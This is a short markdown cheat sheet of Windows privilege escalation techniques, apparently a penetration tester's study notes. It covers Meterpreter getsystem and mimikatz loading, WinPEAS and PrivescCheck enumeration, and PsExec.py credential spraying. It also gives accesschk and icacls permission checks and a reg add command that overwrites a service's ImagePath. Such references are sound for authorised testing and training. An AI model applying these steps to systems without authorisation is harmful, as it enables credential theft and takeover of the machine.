# Meterpreter

``` getsystem ```

``` load module mimikatz ```

# PrivescCheck

|PrivescCheck||
|--- |--- |
|https://github.com/itm4n/PrivescCheck||
|Written in PowerShell||

# WinPEASS

|WinPEASS||
|--- |--- |
|https://github.com/carlospolop/PEASS-ng||
|Comes in both compiled (exe) and batch file||
|GitHub repo also contains LinPEASS||

|Commands|Notes|
|--- |--- |
|winpeas.exe quiet servicesinfo|Gets information about running/installed services|
|||
|||

# MimiKatz

|MimiKatz||
|--- |--- |
|Has a Meterpreter Module||
|Compiled Binary and dll libraries||

# PsExec.py

|PsExec.py||
|https://github.com/SecureAuthCorp/impacket||
|Used to get PowerShell shell on remote windows system(s) (Can be used to spray credentials)||

# Weak Permissions
## Note: Included in SysInternals tools

``` accesschk.exe ```

## Check user access to services

``` accesschk.exe -uwcqv Users *```

``` accesschk.exe -uwcqv "Authenticated Users" * ```

``` accesschk.exe -uwcqv "Everyone" * ```

## Check folder permissions for users (per drive)

``` accesschk.exe -uwdqs Users c:\ ```

``` accesschk.exe -uwdqs "Authenticated Users" c:\ ```

``` accesschk.exe -uwdqs "Everyone" c:\ ```

## Check File Permissions for users (per drive)

``` accesschk.exe -uwqs Users c:\*.* ```

``` accesschk.exe -uwqs "Authenticated Users" c:\*.* ```

``` accesschk.exe -uwqs "Everyone" c:\*.* ```


|ICACLS||
|--- |--- |
|Command | Notes| 
|--- |--- |
|``` icacls $PATHTOEXE 2>nul ```| Can be piped to findstr to filter out results|





|ICACLS Permission Legend||
|--- |--- |
|(F)|Full Access|
|(M)|Modify Access|
|(RX)|Read and Execute Access|
|(R)|Read-Only Access|
|(W)|Write-Only Access|


## LOLBAS

|LOLBAS||
|--- |--- |
|https://lolbas-project.github.io/||
|Living Off The Land Binaries, Scripts, and Libraries||
|Web Interface||


## Check global objects editable by Everyone

``` accesschk -wuo everyone \basednamedobjects ```

## Check Registry Settings

### Note: Service Registry Keys are stored in: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services

### PowerShell

``` Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\Service | fl ```

#### Add Registry Key

``` reg add "HKLM\SYSTEM\CurrentControlSet\services\service" /v ImagePath /t REG_EXPAND_SZ /d $PATHTOEXECUTABLE /f ```

